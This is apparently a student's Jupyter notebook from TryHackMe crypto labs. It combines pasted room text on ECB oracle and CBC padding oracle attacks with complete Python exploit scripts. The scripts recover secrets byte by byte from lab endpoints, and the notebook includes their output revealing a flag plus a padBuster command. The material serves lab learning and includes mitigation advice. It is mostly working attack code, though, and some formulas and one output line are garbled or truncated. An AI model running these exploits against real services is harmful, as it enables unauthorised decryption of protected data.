In [ ]:
#aes cipher block size
DEFAULT_PADDING_SYMBOL = "*"
def custom_pad(message):
    while len(message) % DEFAULT_BLOCK_SIZE != 0:
        message += DEFAULT_PADDING_SYMBOL
    return message
def custom_unpad(message):
    count  = 0
    for x in range (1, len(message)):
        if message[len(message) - x] == DEFAULT_PADDING_SYMBOL:
            count += 1
        else:
            break
    print (count)
    message = message[0:len(message)-count]
    return message

In [ ]:

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad 
from binascii import hexlify, unhexlify
import requests

plaintext = "CryptographyAndABigSecret"
secret_key = "NotAGreatSecret!".encode("utf-8")

cipher = AES.new(secret_key, AES.MODE_ECB)
ciphertext = cipher.encrypt(pad(plaintext.encode("utf-8"), AES.block_size))

print("Ciphertext (hex):", hexlify(ciphertext).decode("utf-8"))

In [ ]:
from Crypto.Cipher import AES
from bs4 import BeautifulSoup
import binascii
import requests

### Variables ###

URL = "http://10.113.135.244:5000/oracle"

BLOCK_SIZE = 0

### Oracle Interface ###

def chat_to_oracle(username):
    r = requests.post(URL, data = {'username' : username})
    #Parse the response
    soup = BeautifulSoup(r.text, 'html.parser')
    #Find the encrypted text
    value = str(soup.find(id='encrypted-result').find('strong'))
    #Extract the value
    value = value.replace('<strong>', '').replace('</strong>', '')

    return value

### Calculate Block Size ###

def calculate_block_size():
    #To calculate the block size, we need to keep sending a large username value until the ciphertext length grows twice

    #Get the initial ciphertext length
    username = "A"
    original_length = len(chat_to_oracle(username))

    #Now grow the username until the length becomes larger, keeping count
    first_change_len = 1
    while (len(chat_to_oracle(username)) == original_length):
        username += "A"
        first_change_len += 1

    print ("First growth was at position: " + str(first_change_len))

    #Get the new length
    new_length = len(chat_to_oracle(username))

    #Now grow the username a second time
    second_change_len = first_change_len
    while (len(chat_to_oracle(username)) == new_length):
         username += "A"
         second_change_len += 1

    print ("Second growth was at position: " + str(second_change_len))

    #With these two values, we can now determine the block size:
    BLOCK_SIZE = second_change_len - first_change_len

    print ("BLOCK_SIZE is: " + str(BLOCK_SIZE))

    return BLOCK_SIZE

def split_ciphertext(ciphertext, block_size):
    #This helper function will take the ciphertext and split it into blocks of the known block size
    #Times two since we have two hex for each char
    block_size = block_size * 2
    chunks = [ ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size) ]
    return chunks

### Calculate the Offset ###

def calculate_offset(block_size):
    #To calculate the offset, we will send known text for double the block size and then gradually grow the text until we get two blocks that are the same

    #Create the initial double block size buffer
    initial_text = ""
    for x in range(block_size * 2):
        initial_text += "A"

    #Send this buffer to get the initial ciphertext
    ciphertext = chat_to_oracle(initial_text)

    chunks = split_ciphertext(ciphertext, block_size)

    #Ensure that there are no duplicates already, since this would indicate that there is no offet

    if (len(chunks) != len(set(chunks))):
        print ("No offset found!")
        offset = 0
        return offset

    #If we got here, there is an offet. We will slowly add more text to the start of the username until we get a duplicate
    offset = 0
    while (len(chunks) == len(set(chunks))):
        offset += 1
        #Increment the text by one
        initial_text = "B" + initial_text

        ciphertext = chat_to_oracle(initial_text)
        chunks = split_ciphertext(ciphertext, block_size)

    #Once we exit the loop, it means we have a duplicate chunk and have determined the offset

    print ("Offset is: " + str(offset))

    return offset

### Extract information from the Oracle ###
def brute_forcer(reference_chunk, initial_text, block_size, offset, target_block=1):
    #Character list covers letters, digits and common symbols
    charlist = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 _-!@#$%^&*()+={}[]|;:,.<>?'

    for char in charlist:
        test_text = initial_text + char

        ciphertext = chat_to_oracle(test_text)
        chunks = split_ciphertext(ciphertext, block_size)

        #Test to see if our chunk matches the reference chunk
        if (reference_chunk == chunks[target_block]):
            print ("Found the char: " + char)
            return char

    return None

def extract_first_byte(block_size, offset):
    #Now that we have both the block_size and the offset, we are ready to stage our attack. We will showcase how to do this for a single bit. Then the process has to repeat.

    #To start, we will craft our initial text.
    initial_text = ""

    #First we need to take care of the offset
    for x in range(offset):
        initial_text += "B"

    #Now we want to populate the rest of the text up to the block size except for the last byte
    for x in range(block_size - 1):
        initial_text += "A"

    #Now let's chat to the oracle and get our reference chunk
    ciphertext = chat_to_oracle(initial_text)
    chunks = split_ciphertext(ciphertext, block_size)

    #Our reference chunk will be the second chunk since we have an offset
    reference_chunk = chunks[1]

    print ("Reference chunk is: " + str(reference_chunk))

    #Now we can start the brute force
    char = brute_forcer(reference_chunk, initial_text, block_size, offset)
    return char

def extract_all_bytes(block_size, offset):
    recovered = ""

    for n in range(block_size * 8):  # try up to 8 blocks worth of secret bytes
        pos_in_block = n % block_size
        padding      = block_size - 1 - pos_in_block
        target_block = 1 + (n // block_size)
        known_suffix = recovered[n - pos_in_block : n]

        # Get reference ciphertext: offset B's + padding A's, secret fills the rest
        ref_text   = "B" * offset + "A" * padding
        ciphertext = chat_to_oracle(ref_text)
        chunks     = split_ciphertext(ciphertext, block_size)

        # If target block no longer exists, the secret has been fully recovered
        if target_block >= len(chunks):
            print ("Secret fully recovered!")
            break

        reference_chunk = chunks[target_block]

        # Brute force: offset B's + padding A's + known bytes in this block + guess
        brute_base = "B" * offset + "A" * padding + known_suffix
        char = brute_forcer(reference_chunk, brute_base, block_size, offset, target_block)

        if char is None:
            print ("No match at position " + str(n) + " — secret fully recovered!")
            break

        recovered += char
        print ("[" + str(n + 1) + "] Recovered so far: " + recovered)

    return recovered

if __name__ == '__main__':

    #Send a message to the oracle and print the ciphertest
    print ("Testing the oracle")
    ciphertext = chat_to_oracle("SuperUser")
    print("Ciphertext for the username of SuperUser is: " + ciphertext)

    #Calculate the block size from the oracle
    print ("Calculating the block size")
    size = calculate_block_size()
    print ("Block size is: " + str(size))

    #Calculate the offset from the oracle
    print ("Calculating the offset")
    offset = calculate_offset(size)
    print ("Offset is: " + str(offset))

    #Extract the full secret byte by byte
    print ("Extracting full secret...")
    secret = extract_all_bytes(size, offset)
    print ("Full secret: " + secret)


Pentesters

If you see an ECB implementation, you should raise alarm bells. This might sound silly, but it has been found in the wild in cases as late as 2022 (opens in new tab)! Sometimes, you may have to enumerate to determine if ECB is being used. As shown in this room, a good way to determine this is to use raw image data, which can often show recognisable patterns in the ciphertext. Furthermore, if you find an ECB oracle that accepts input data from you, you can stage an attack to recover additional and potentially sensitive plaintext data.
Mitigation Measures for Secure Coders

For developers, it is critical to ensure they are not using insecure cipher modes, such as ECB. Instead, cipher modes such as -GCM or -CCM should be used, especially when the ciphertext is calculated using user-provided data, and the output will be returned to the end user.
Conclusion

We focused on symmetric encryption throughout this room and explained how block ciphers worked. We explained how a secure encryption algorithm such as can be insecurely implemented if an outdated and vulnerable cipher mode is used. We highlighted the insecurities of ECB, how it is possible to determine when it is being used, and how an ECB oracle can be attacked to uncover potentially sensitive information.

We hope you enjoyed this room and found it insightful. Let us know through our Discord (opens in new tab)channel or X account (opens in new tab) if you have any feedback or thoughts. See you around.
Answer the questions below

I understand how to attack ECB oracles!

In [ ]:
Encryption is key to keeping data safe, but even strong encryption can fail if not implemented correctly. One example is the Padding Oracle attack, a vulnerability that takes advantage of how encrypted data is processed, mainly when padding is used.

Padding oracle attacks happen when an application reveals whether the padding in encrypted data is correct or not through detailed error messages or variations in response time. Attackers can exploit these slight clues to figure out the original data without the encryption key. This attack targets encryption methods like Cipher Block Chaining (CBC), which uses padding to handle data of different lengths. The padding oracle attack is named because the server acts as an "oracle" by providing feedback on whether the padding in the ciphertext is valid.
Learning Objectives
Throughout this room, you will gain a comprehensive understanding of the following key concepts:

    Padding schemes
    Block cipher modes
    Encryption and decryption mechanism
    How does the padding oracle attack work
    Automation mechanism
    Mitigation and best practices

    Now that you have a solid understanding of how encryption and decryption work in CBC mode, let’s shift our focus to the padding oracle attack. This task will explore how weaknesses in padding validation can be exploited to decrypt a ciphertext without knowledge of the key.

The padding oracle attack's foundation lies in the formula:

Pi ​= Dk(Ci) Ci−1

Here, Pi ​ represents the plaintext of the ith block, Dk​(Ci) is the decrypted ciphertext or the intermediate value using the key k, and Ci−1 ​ is the ciphertext of the previous block (or IV for the first block). This formula is crucial in exploiting padding vulnerabilities, highlighting the relationship between plaintext, ciphertext, and decryption. The attack focuses on uncovering Dk(Ci) byte by byte by interacting with the oracle, which reveals whether the padding is valid or not. This method doesn't directly expose the plaintext but progressively reveals the intermediary decryption state Dk(Ci).
Theoretical Understanding

Let’s assume we encrypted the string "TryHackMe" using CBC mode, and padding was added to align the plaintext with the block size. We have the following information:

    IV: 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 (hex representation of ASCII "1").
    Ciphertext: 88 12 4e 09 e2 0e ab 43 f7 c3 23 2d 92 5a 1a ee.

The ciphertext comprises one 16-byte block (𝐶1), and the IV (𝐶0) is used during decryption. The attack starts by targeting the last byte of the IV (which can also be referred to as the modified IV) and systematically works backwards, as shown below:

Image showing brute forcing technique for first byte.

Step 1: Targeting the Last Byte

We will begin by modifying the last byte of the IV (C0[16] or test[16]) to reveal the last byte of the intermediate decrypted block (Dk​(C1)[16]). The oracle is used to check if the padding is valid. If so, then we know that:

Dk​(C1​)[16] XOR test[16] = 0x01

Image showing brute forcing technique for first byte with valid padding.

In the above figure, it is important to note that if the padding is valid, the last byte in the plaintext is supposed to be 0x01. From this, we will calculate:

Dk (C1)[16] = test[16] 0x01

For example, if the valid guess is test[16]=0x37, then:

Dk(C1)[16] = 0x37 0x01 = 0x36

Once Dk(C1)[16] is known, we will use the formula to find the plaintext byte P1[16] = Dk(C1)[16] C0[16].

If we substitute the real numbers:

P1[16] = 0x37 0x31 = 0x06

This reveals the last byte of the plaintext block.

Step 2: Moving to the Second-to-Last Byte

Next, we will target the second-to-last byte of C1. We will modify C0[15] while fixing C0[16] to ensure valid padding of 0x02 0x02. To reveal Dk(C1)[15], the oracle checks if:

Dk(C1)[15] XOR test[15] = 0x02

When the padding is valid, we will calculate:

Dk(C1)[15] = test[15] XOR 0x02

For instance, if test[15]=0x34, then:

Dk(C1)[15] = 0x34 XOR 0x02 = 0x36

The plaintext byte is then recovered using:

P1[15] = Dk(C1)[15] XOR C0[15]

Substituting again :

P1[15] = 0x36 XOR 0x31 = 0x7

Step 3: Revealing All Bytes in the Block

Now, as an attacker, we will continue this process for all bytes in the block, working from the last byte to the first byte. For each byte, we will modify the test byte to match the required padding value and then calculate Dk(C1)[i] once valid padding is found. Once we get that, we derive the plaintext byte P1[i] using the formula  P1[i] = Dk(C1)[i] XOR C0[i]. By the end of the process, we will fully recover the plaintext block.

Step 4: Final Plaintext Recovery

After recovering all bytes in the block, we will combine them to reconstruct the plaintext. For C1 ​, the recovered plaintext is: P1 = 54 72 79 48 61 63 6b 4d 65 06 06 06 06 06 06 06 and after removing the padding (0x06), the final plaintext will be "TryHackMe".
Testing Using Python Script

Have you noticed that the attack revolves around brute-forcing and trying multiple values, which hints at using loops? The entire padding oracle attack can be automated using Python. A script can iteratively modify the bytes of the IV or ciphertext, sending requests to the server and analysing the responses. If the server indicates invalid padding, the script adjusts the byte and tries again until validation. By systematically testing all possible byte combinations, the script reveals the intermediate decrypted values, which are then used to compute the plaintext for the entire ciphertext block by block.

In the attached VM, visit the URL http://padding.thm:5001, where you will see a screen that will show the original IV, ciphertext, modified IV, modified ciphertext, etc. and a button to start the brute force attack, as shown below:

Image showing padding oracle simulation.

The backend code that performs the brute force consists of a nested for loop and performs a padding oracle attack by iterating through all possible byte values (0-255) for each position of the modified_iv. It sends the modified ciphertext to the server and checks if the response indicates valid padding. Upon receiving a valid response, it computes the corresponding keystream byte and plaintext byte, gradually reconstructing the original plaintext block-by-block. You can review the code snippet shown below:
Click here to review the code snippet containing iterating using nested for loop for padding oracle attack!

 

 

In the above code, the nested for loop facilitates a byte-by-byte decryption process in a padding oracle attack. The outer loop iterates through the bytes of the IV in reverse order, starting from the last byte and working toward the first. This ensures that decryption happens one byte at a time. For each byte, the inner loop tries all possible values (0–255) by modifying the corresponding byte in the modified_iv. The modified ciphertext (modified_ct), which is a combination of the altered modified_iv and the original ciphertext, is then sent to the padding oracle via a POST request. If the server responds with a status code 200, indicating valid padding, the corresponding decrypted text is extracted. The keystream and plaintext bytes are computed for the current position, gradually reconstructing the original plaintext. 

Click on the Start Bruteforce button to launch the attack. The complete process would extract the plaintext as shown in the following image:

Image showing padding oracle simulation revealing plaintext.

If you are interested in looking at the exact value of the modified IV, the modified CT and the resulting plaintext at each stage, you can click on logs to view the value for each 16 bytes as shown below:

Image showing logs after successful padding oracle attack.

In [31]:
import requests
from binascii import hexlify

# Reines Python Padding-Oracle Setup
DECRYPT_URL = "http://padding.thm:5002/decrypt"
BLOCK_SIZE = 16


def oracle_check(modified_iv: bytearray, original_ct: bytearray):
    """Sendet GET /decrypt?ciphertext=<iv||ct hex> und liefert
    (is_valid, status_code, response_text, payload_hex) zurueck.
    """
    payload_hex = hexlify(modified_iv + original_ct).decode()

    response = requests.get(
        DECRYPT_URL,
        params={"ciphertext": payload_hex},
        timeout=10,
    )

    response_text = response.text
    body = response_text.lower()

    is_valid = False

    # Falls JSON mit explizitem bool geliefert wird, das bevorzugen
    try:
        data = response.json()
        if isinstance(data, dict):
            for key in ("valid", "success", "ok"):
                if key in data:
                    is_valid = bool(data[key])
                    break
    except ValueError:
        pass

    # Fallback-Heuristik
    if not is_valid and response.status_code == 200:
        invalid_markers = [
            "invalid padding",
            "padding invalid",
            "bad padding",
            "padding error",
            "invalid",
            "error",
            "exception",
            "failed",
        ]
        is_valid = not any(marker in body for marker in invalid_markers)

    return is_valid, response.status_code, response_text, payload_hex


def strip_pkcs7(data: bytes) -> bytes:
    if not data:
        return data
    pad_len = data[-1]
    if pad_len < 1 or pad_len > BLOCK_SIZE:
        return data
    if data[-pad_len:] != bytes([pad_len]) * pad_len:
        return data
    return data[:-pad_len]


def _collect_valid_guesses(iv_index, keystream, original_iv, original_ct):
    """Sammelt alle Guess-Bytes, die gueltiges Padding produzieren."""
    padding = BLOCK_SIZE - iv_index

    trial_iv = bytearray(original_iv)
    for j in range(iv_index + 1, BLOCK_SIZE):
        trial_iv[j] = keystream[j] ^ padding

    valid_guesses = []
    last_status = None
    last_body = ""
    last_payload = ""

    for guess in range(256):
        trial_iv[iv_index] = guess
        try:
            valid, status_code, body_text, payload_hex = oracle_check(trial_iv, original_ct)
            last_status = status_code
            last_body = body_text
            last_payload = payload_hex
        except requests.RequestException as ex:
            last_status = "REQUEST_EXCEPTION"
            last_body = str(ex)
            last_payload = hexlify(trial_iv + original_ct).decode()
            continue

        if valid:
            valid_guesses.append(guess)

    return valid_guesses, last_status, last_body, last_payload


def _solve_with_backtracking(iv_index, keystream, plaintext, original_iv, original_ct):
    if iv_index < 0:
        return True

    padding = BLOCK_SIZE - iv_index
    valid_guesses, last_status, last_body, last_payload = _collect_valid_guesses(
        iv_index, keystream, original_iv, original_ct
    )

    if not valid_guesses:
        print("\n[DEBUG] Kein Treffer fuer aktuelles Byte")
        print(f"[DEBUG] Byte-Index: {iv_index}")
        print(f"[DEBUG] Erwartetes Padding: 0x{padding:02x}")
        print(f"[DEBUG] Letzter HTTP-Status: {last_status}")
        print(f"[DEBUG] Letzte Response (erste 300 Zeichen): {last_body[:300]!r}")
        print(f"[DEBUG] Letzter Payload (modified_iv||ct, hex): {last_payload}")
        print(f"[DEBUG] Endpoint: {DECRYPT_URL}")
        return False

    # Mehrere Kandidaten sind moeglich, daher Backtracking
    for guess in valid_guesses:
        k_byte = guess ^ padding
        p_byte = k_byte ^ original_iv[iv_index]

        keystream[iv_index] = k_byte
        plaintext[iv_index] = p_byte

        if len(valid_guesses) > 1:
            print(
                f"Byte {iv_index:2d}: versuche guess=0x{guess:02x} "
                f"(Kandidaten={len(valid_guesses)})"
            )

        if _solve_with_backtracking(iv_index - 1, keystream, plaintext, original_iv, original_ct):
            printable = chr(p_byte) if 32 <= p_byte <= 126 else "."
            print(
                f"Byte {iv_index:2d}: guess=0x{guess:02x} | "
                f"keystream=0x{k_byte:02x} | plaintext=0x{p_byte:02x} ('{printable}')"
            )
            return True

    return False


def padding_oracle_decrypt_single_block(original_iv_hex: str, original_ct_hex: str):
    original_iv = bytearray.fromhex(original_iv_hex)
    original_ct = bytearray.fromhex(original_ct_hex)

    if len(original_iv) != BLOCK_SIZE or len(original_ct) != BLOCK_SIZE:
        raise ValueError("IV und Ciphertext muessen jeweils genau 16 Bytes lang sein.")

    keystream = [0] * BLOCK_SIZE
    plaintext = [0] * BLOCK_SIZE

    solved = _solve_with_backtracking(
        BLOCK_SIZE - 1,
        keystream,
        plaintext,
        original_iv,
        original_ct,
    )

    if not solved:
        raise RuntimeError("Block konnte nicht per Padding Oracle geloest werden.")

    keystream_bytes = bytes(keystream)
    plaintext_bytes = bytes(plaintext)

    print("\nOriginal IV (hex):", original_iv.hex())
    print("Original CT (hex):", original_ct.hex())
    print("Keystream (hex): ", keystream_bytes.hex())
    print("Plaintext (hex): ", plaintext_bytes.hex())
    print("Plaintext raw:   ", plaintext_bytes)
    print("Plaintext text:  ", strip_pkcs7(plaintext_bytes).decode(errors="replace"))

    return keystream_bytes, plaintext_bytes

In [ ]:
# Encrypted input from the task: IV (16 bytes) + ciphertext block (16 bytes)
encrypted_hex = "31323334353637383930313233343536bdcc4a2319946dc9b30203d89dba9fce"

# Split into IV and ciphertext block (AES block size = 16 bytes = 32 hex chars)
original_iv_hex = encrypted_hex[:32]
original_ct_hex = encrypted_hex[32:64]

print("IV:", original_iv_hex)
print("CT:", original_ct_hex)

# Use the padding-oracle attack function from the previous cell
auto_keystream, auto_plaintext = padding_oracle_decrypt_single_block(original_iv_hex, original_ct_hex)

print("\n[RESULT] Plaintext block (hex):", auto_plaintext.hex())
print("[RESULT] Plaintext block (text):", strip_pkcs7(auto_plaintext).decode(errors="replace"))

#padBuster http://padding.thm:5002/decrypt?ciphertext=31323334353637383930313233343536bdcc4a2319946dc9b30203d89dba9fce 31323334353637383930313233343536bdcc4a2319946dc9b30203d89dba9fce 16 -encoding 1


IV: 31323334353637383930313233343536
CT: bdcc4a2319946dc9b30203d89dba9fce
Byte  0: guess=0x66 | keystream=0x76 | plaintext=0x47 ('G')
Byte  1: guess=0x52 | keystream=0x5d | plaintext=0x6f ('o')
Byte  2: guess=0x49 | keystream=0x47 | plaintext=0x74 ('t')
Byte  3: guess=0x66 | keystream=0x6b | plaintext=0x5f ('_')
Byte  4: guess=0x6d | keystream=0x61 | plaintext=0x54 ('T')
Byte  5: guess=0x55 | keystream=0x5e | plaintext=0x68 ('h')
Byte  6: guess=0x58 | keystream=0x52 | plaintext=0x65 ('e')
Byte  7: guess=0x6e | keystream=0x67 | plaintext=0x5f ('_')
Byte  8: guess=0x77 | keystream=0x7f | plaintext=0x46 ('F')
Byte  9: guess=0x5b | keystream=0x5c | plaintext=0x6c ('l')
Byte 10: guess=0x56 | keystream=0x50 | plaintext=0x61 ('a')
Byte 11: guess=0x50 | keystream=0x55 | plaintext=0x67 ('g')
Byte 12: guess=0x07 | keystream=0x03 | plaintext=0x30 ('0')
Byte 13: guess=0x07 | keystream=0x04 | plaintext=0x30 ('0')
Byte 14: guess=0x00 | keystream=0x02 | plaintext=0x37 ('7')
Byte 15: guess=0x36 | keys

Pentesters

Padding oracle effectively assists in decrypting sensitive data without knowing the encryption key. As a pentester, ensure the following practices to exploit the vulnerability:image showing protection against padding oracle through a lock sign.

    Black-Box Testing: Identify encrypted data in application inputs or responses (cookies, responses). Once you have the encrypted data, modify the ciphertext byte-by-byte and observe server behaviour for error patterns that reveal padding issues. 
    Grey-Box Testing: The pentester has access to partial web application source code or documentation to analyse how padding errors are handled, craft targeted ciphertexts, and monitor server responses.
    Use Automation: Use tools like PadBuster to automate the process of identifying server responses and modifying ciphertexts or initialisation vectors to increase the exploitation efficiency. 

Mitigation Measures for Secure Coders

As a secure coder, you can take the following measures to prevent the web app from padding oracle attack: 

    Use Authenticated Encryption: Make sure to use authentication encryption like -GCM or -CCM, which combine encryption and authentication to prevent ciphertext manipulation.
    Avoid Revealing Errors: Avoid displaying errors like invalid padding in a production environment that would provide additional knowledge to a pentester while evaluating the web app.
    Validate Inputs Securely: Avoid processing invalid input, such as ciphertext, on the server side. For example, filter invalid ciphertext without performing decryption. 
    Keep Libraries Updated: Use the latest cryptographic libraries to avoid vulnerabilities from outdated implementations.

    Throughout this room, we have focused on exploiting a padding oracle vulnerability. We started by building an understanding of block cipher modes and focused specifically on CBC mode, exploring encryption and decryption processes. From there, we examined how padding oracle vulnerabilities arise, exploring how these attacks exploit weaknesses in padding validation to decrypt data without access to the encryption key.

Moving forward, we explored the attack methodology, demonstrating step-by-step how attackers manipulate ciphertext and analyse server responses to uncover plaintext. We also emphasised the importance of automation using PadBuster, which streamlines the exploitation process and enhances efficiency. Finally, we shifted our focus to mitigation strategies and best practices, empowering secure coders to safeguard applications against such vulnerabilities. 